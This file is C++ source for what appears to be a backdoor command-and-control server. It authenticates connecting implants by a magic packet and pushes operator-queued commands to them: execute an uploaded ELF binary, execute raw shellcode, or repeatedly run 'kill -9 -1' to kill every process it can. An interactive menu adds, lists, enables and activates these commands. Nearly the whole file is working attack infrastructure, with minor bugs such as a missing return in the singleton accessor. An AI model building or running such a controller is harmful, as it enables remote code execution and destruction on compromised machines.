#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/sendfile.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h> 
#include <string>
#include <sys/prctl.h>
#include <map>
#include <set>
#include "crazy-common.h"

using namespace std;

typedef int (*HANDLE_FUNC)(int, const BKMessage *);

FILE * g_log_fp = NULL;

void log(const char * fmt, ...)
{
    va_list args;
    va_start (args, fmt);
    time_t rawtime = 0;
    time(&rawtime);
    char buf[256] = {0};
    sprintf(buf, "%s: %s", ctime(&rawtime), fmt);
    vfprintf (g_log_fp, buf, args);
    va_end (args);
    fflush(g_log_fp);
}

class CmdConfig
{
private:
    CmdConfig()
    {
       pthread_rwlock_init(&_mutex, NULL);
       _id = 0;
       _active = false;
    }
    ~CmdConfig()
    {
        pthread_rwlock_destroy(&_mutex);
    }
        
public:
    static CmdConfig * instance()
    {
        if(_instance == 0)
        {
            if(_instance == 0)
            {
                _instance = new CmdConfig();
            }
        }
    }
    
    static void destroy()
    {
        delete _instance;
    }
    
    int add_cmd_config(BKMessage * msg, const char * filename = NULL)
    {
        pthread_rwlock_wrlock(&_mutex);
        if(filename == NULL)
            _cmd_configs[_id] = BKConfig(msg);
        else
            _cmd_configs[_id] = BKConfig(msg, filename);
        pthread_rwlock_unlock(&_mutex);
        return _id++;
    }
        
    int del_cmd_config(int id)
    {
        int result = 0;
        pthread_rwlock_wrlock(&_mutex);
        map<int, BKConfig>::iterator ite = _cmd_configs.find(id);
        if(ite != _cmd_configs.end())
        {
            delete[] ite->second.msg;
            _cmd_configs.erase(ite);
        }
        else
        {
            result = 1;
        }
        pthread_rwlock_unlock(&_mutex);
        return result;
    }
    
    int set_cmd_config_enabled(int id, bool v)
    {
        int result = -1;
        pthread_rwlock_wrlock(&_mutex);
        map<int, BKConfig>::iterator ite = _cmd_configs.find(id);
        if(ite != _cmd_configs.end())
        {
            ite->second.enabled = v;
            result = 0;
        }
        pthread_rwlock_unlock(&_mutex);
        return result;
    }
    
    void show_all()
    {
        pthread_rwlock_rdlock(&_mutex);
        map<int, BKConfig>::const_iterator ite = _cmd_configs.begin();
        const char * fmt = "%02d\t%20s\t%05d\t%06d\t%07s\t%s\n";
        printf("id\t%20s\tcycle\tperiod\tenabled\tpath\n", "type");
        for(; ite != _cmd_configs.end(); ++ite)
        {
            BKMessage * msg = ite->second.msg;
            printf(fmt, ite->first, msg->get_type_str(), msg->is_cycle, msg->peroid, ite->second.enabled?"true":"false", ite->second.filename.c_str());
        }
        pthread_rwlock_unlock(&_mutex);
    }
    
    void post_all(HANDLE_FUNC func, int fd)
    {
        if(!_active)
            return;
        
        pthread_rwlock_rdlock(&_mutex);
        map<int, BKConfig>::const_iterator ite = _cmd_configs.begin();
        for(; ite != _cmd_configs.end(); ++ite)
        {
            if(ite->second.enabled)
                func(fd, ite->second.msg);
        }
        pthread_rwlock_unlock(&_mutex);
    }
    
    void clean_all()
    {
        pthread_rwlock_wrlock(&_mutex);
        map<int, BKConfig>::iterator ite = _cmd_configs.begin();
        for(; ite != _cmd_configs.end();)
        {
            delete[] ite->second.msg;
            _cmd_configs.erase(ite++);
        }
        pthread_rwlock_unlock(&_mutex);
    }
    
    void set_active(bool v)
    {
        _active = v;
    }
    
    bool get_active()const
    {
        return _active;
    }
    
private:
    struct BKConfig
    {
        BKMessage * msg;
        string filename;
        bool enabled;
        BKConfig(BKMessage * p, const string & path)
        {
            msg = p;
            filename = path;
            enabled = true;
        }
        
        BKConfig():msg(0),enabled(true)
        {}
        
        BKConfig(BKMessage * p):msg(p), enabled(true)
        {}
    };

    static CmdConfig * _instance;
    pthread_rwlock_t _mutex;
    /* 通过shell下的命令列表 */
    map<int, BKConfig> _cmd_configs;
    int _id;
    bool _active;
};

CmdConfig * CmdConfig::_instance = NULL;

/***************************** 通讯处理 ********************************/
int send_cmd(int fd, const BKMessage * msg)
{
    return send(fd, (void *)msg, sizeof(BKMessage) + ntohl(msg->content_size), 0);
}

void * handle_new_conn(void * arg)
{
    int fd = (int)(long)arg;

    BKMessage msg;
    int len = receive_len(fd, (char *)&msg, sizeof(msg));
    if(len == -1)
    {
        goto end;
    }
    
    //dump(&msg);
    msg.magic = ntohl(msg.magic);
    //第一个包必须是认证包
    if(msg.magic != MAGIC || msg.cmdcode != 0xFF)
    {
        //printf("bad ass\n");
        goto end;
    }
    
    CmdConfig::instance()->post_all(send_cmd, fd);
end:
    close(fd);
    return NULL;
}

int start_server(void * arg)
{
    prctl(PR_SET_PDEATHSIG, 9);//SIGKILL
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(sock < 0)
    {
        perror("sock");
        exit(1);
    }
    
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(PEER_PORT);
    srv_addr.sin_addr.s_addr = inet_addr(PEER_IP);
    
    if(bind(sock, (struct sockaddr *)&srv_addr, sizeof(srv_addr)) < 0)
    {
        perror("bind");
        exit(1);;
    }
    
    if(listen(sock, 40) < 0)
    {
        perror("listen");
        exit(1);;
    }
    
    map<unsigned int, multiset<long> > g_dos_prevent_iprecord;
    while(1)
    {
        struct sockaddr_in client_addr;
        memset(&client_addr, 0, sizeof(client_addr));
        socklen_t len = sizeof(client_addr);
        int new_fd = accept(sock, (struct sockaddr *)&client_addr, &len);
        if(new_fd < 0)
        {
            perror("accept");
            exit(1);
        }
        
        unsigned int ip = client_addr.sin_addr.s_addr;
        multiset<long> & time_record = g_dos_prevent_iprecord[ip];
        time_record.insert(time(0));
        size_t record_size = time_record.size();
        if(record_size > 10)
        {
            long first = *time_record.begin();
            long last = *time_record.rbegin();
            //printf("first=%ld,last=%ld size=%u\n", first, last, record_size);
            if((double)record_size/(last - first) > 1.0)//连接数除以时间段，大于每秒1次拒绝连接
            {
                log("IP %s banned\n", inet_ntoa(client_addr.sin_addr));
                close(new_fd);
                continue;
            }
        }
        
        struct timeval timeout = {5,0};
        setsockopt(new_fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(struct timeval));
        setsockopt(new_fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(struct timeval));
        
        pthread_t tid = 0;
        pthread_create(&tid, NULL, handle_new_conn, (void *)new_fd);
        //printf("new conn from %s, new tid=%ld\n", inet_ntoa(client_addr.sin_addr), tid);
    }
    
    return 0;
}

/************************** 界面 ******************************/
class UI
{
public:
    UI(){}
    ~UI(){}
    static void start()
    {
        while(1)
        {
            int choice = menu();
            switch(choice)
            {
            case 1:
                add();
                break;
            case 2:
                del();
                break;
            case 3:
                listall();
                break;
            case 4:
                clearall();
                break;
            case 5:
                turn_cmd_on_off();
                break;
            case 6:
                active();
                break;
            case 7:
                deactive();
                break;
            default:
                puts("invalid choice");
                break;
            }
        }
    }
    
private:
    static char * readfile(const char * filename, int & filesize)
    {
        char * ptr = 0;
        int fd = open(filename, 0);
        if(fd < 0)
            return NULL;
        
        filesize = lseek(fd, 0, SEEK_END);
        if(filesize > 0)
        {
            lseek(fd, 0, SEEK_SET);
            ptr = new char[sizeof(BKMessage) + filesize];
            int offset = 0;
            int len = 0;
            while((len = read(fd, ptr + sizeof(BKMessage) + offset, filesize - offset)) > 0)
            {
                offset += len;
                if(offset >= filesize)
                    break;
            }
            
            if(offset == 0)
            {
                delete[] ptr;
                ptr = NULL;
            }
            filesize = offset;
        }
        close(fd);
        return ptr;
    }
    
    static int readline(char * buffer, int size)
    {       
        return readline(0, buffer, size);
    }
    
    static int readline(int fd, char * buffer, int size)
    {
        int i = 0;
        for(; i < size; ++i)
        {
            if(read(fd, &buffer[i], 1) <= 0)
                return i;
            if(buffer[i] == '\n' || buffer[i] == '\r')
            {
                buffer[i] = 0;
                break;
            }
        }
        buffer[size - 1] = 0;
        return i;
    }
    
    static int menu()
    {
        puts("~~~~~~~~~~~~~~~~~~~~");
        if(!CmdConfig::instance()->get_active())
            puts("Config NOT active.");
        else
            puts("Config active.");
        puts("1.add cmd");
        puts("2.delete cmd");
        puts("3.list all");
        puts("4.clear all");
        puts("5.enable/disable cmd");
        puts("6.active");
        puts("7.deactive");
        printf(">");
        return get_number();
    }
    
    static int get_number()
    {
        char nptr[32] = {0};
        readline(nptr, 32);
        return atoi(nptr);
    }
    
    static void add()
    {
        printf("Choose cmd type:\n");
        puts("1.execution of a ELF file");
        puts("2.execution of shellcode");
        puts("3.execution of kill -9 -1");
        //puts("4.execution of kill specific process");
        printf(">");
        int choice = get_number();
        switch(choice)
        {
        case 1:
            {
                char filepath[256] = {0};
                printf("ELF file path:");
                readline(filepath, sizeof(filepath));
                int filesize = 0;
                char * p = readfile(filepath, filesize);
                if(p)
                {
                    BKMessage * msg = (BKMessage *)p;
                    msg->magic = htonl(MAGIC);
                    msg->cmdcode = 0x01;
                    msg->is_cycle = 0;
                    msg->peroid = 0;
                    msg->content_size = htonl(filesize);
                    //dumpHex(msg->content, filesize);
                    int id = CmdConfig::instance()->add_cmd_config(msg, filepath);
                    printf("Added %d.\n", id);
                }
                else
                {
                    puts("File cannot read.");
                }
            }
            break;
        case 2:
            {
                char filepath[256] = {0};
                printf("Shellcode file path:");
                readline(filepath, sizeof(filepath));
                int filesize = 0;
                char * p = readfile(filepath, filesize);
                if(p)
                {
                    BKMessage * msg = (BKMessage *)p;
                    msg->magic = htonl(MAGIC);
                    msg->cmdcode = 0x02;
                    msg->is_cycle = 0;
                    msg->peroid = 0;
                    msg->content_size = htonl(filesize);
                    int id = CmdConfig::instance()->add_cmd_config(msg, filepath);
                    printf("Added %d.\n", id);
                }
                else
                {
                    puts("File cannot read.");
                }
            }
            break;
        case 3:
            {
                printf("you want to kill all you can kill except yourself?(y/n)");
                char choice[2] = {0};
                readline(choice, 2);
                if(choice[0] != 'y' && choice[0] != 'Y')
                    break;
                char is_cycle = 0;
                char peroid = 0;
                printf("Repeatedly execute?(y/n)");
                readline(choice, 2);
                if(choice[0] == 'y' || choice[0] == 'Y')
                {
                    is_cycle = 1;
                    printf("Period in seconds:");
                    peroid = get_number();
                }
                BKMessage * msg = new BKMessage;
                msg->cmdcode = 0x03;
                msg->is_cycle = is_cycle;
                msg->peroid = peroid;
                int id = CmdConfig::instance()->add_cmd_config(msg);
                printf("Added %d.\n", id);
            }
            break;
        /*
        case 4:
            {
                char filepath[256] = {0};
                printf("Keywords file path:");
                readline(filepath, sizeof(filepath));
                int filesize = 0;
                char * p = readfile(filepath, filesize);                
                if(p)
                {
                    //行尾符换成0
                    for(int i = sizeof(BKMessage); i < filesize + sizeof(BKMessage); ++i)
                    {
                        if(p[i] == '\r' || p[i] == '\n')
                        {
                            p[i] = '\0';
                        }
                    }
                    
                    char is_cycle = 0;
                    char peroid = 0;
                    printf("Repeatedly execute?(y/n)");
                    char choice[2] = {0};
                    readline(choice, 2);
                    if(choice[0] == 'y' || choice[0] == 'Y')
                    {
                        is_cycle = 1;
                        printf("Period in seconds:");
                        peroid = get_number();
                    }
                    BKMessage * msg = (BKMessage *)p;
                    msg->magic = htonl(MAGIC);
                    msg->cmdcode = 0x05;
                    msg->is_cycle = is_cycle;
                    msg->peroid = peroid;
                    msg->content_size = htonl(filesize);
                    int id = CmdConfig::instance()->add_cmd_config(msg, filepath);
                    printf("Added %d.\n", id);
                }
                else
                {
                    puts("File cannot read.");
                }
            }
            break;*/
        default:
            puts("invalid choice");
            break;
        }
    }
    
    static void del()
    {
        printf("input the cmd id:");
        int id = get_number();
        if(CmdConfig::instance()->del_cmd_config(id) == 0)
        {
            printf("cmd %d deleted.\n", id);
        }
        else
        {
            puts("not found.");
        }
    }
    
    static void listall()
    {
        printf("cmd will be executed sequencely.\n=============================================================\n");
        CmdConfig::instance()->show_all();
        printf("=============================================================\n");
    }
    
    static void clearall()
    {
        char choice[2] = {0};
        printf("are you sure to clear all cmd?(y/n)");
        readline(choice, 2);
        if(choice[0] != 'y' && choice[0] != 'Y')
            return;
        CmdConfig::instance()->clean_all();
    }
    
    static void active()
    {
        CmdConfig::instance()->set_active(true);
    }
    
    static void deactive()
    {
        CmdConfig::instance()->set_active(false);
    }
    
    static void turn_cmd_on_off()
    {
        printf("input the cmd id:");
        int id = get_number();
        printf("set cmd enable/disable(1/0)?");
        int v = get_number();
        int result = CmdConfig::instance()->set_cmd_config_enabled(id, (bool)v);
        if(result == -1)
        {
            printf("cmd %d not found.\n", id);
        }
        else
        {
            printf("cmd %d %s.\n", id, v?"enabled":"disabled");
        }
    }
};

typedef int (*CLONE_PROC_FUNC)(void *);
/*创建轻量级进程
  所有子进程都共享内存、文件系统、IO、信息处理、SYSV信号量等资源。
  但不是线程，有独立的进程号，被杀死也不会互相影响，相比fork性能更高
*/
pid_t start_new_shared_proc(CLONE_PROC_FUNC proc_func)
{
    #define STACK_SIZE 1024*1024
    char * stack = new char[STACK_SIZE];
    char * stackTop = stack + STACK_SIZE;
    pid_t pid = clone(proc_func, stackTop, CLONE_FS|CLONE_VM|CLONE_FILES|CLONE_IO|CLONE_SIGHAND|CLONE_SYSVSEM, 0);
    if (pid == -1)
    {
        perror("clone");
        return -1;
    }
    return pid;
}

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    g_log_fp = fopen("crazy-server-log.txt", "wb+");
    if(g_log_fp == NULL)
    {
        printf("cannot create log file.\n");
        return 1;
    }
    
    start_new_shared_proc(start_server);
    UI::start();
    return 0;
}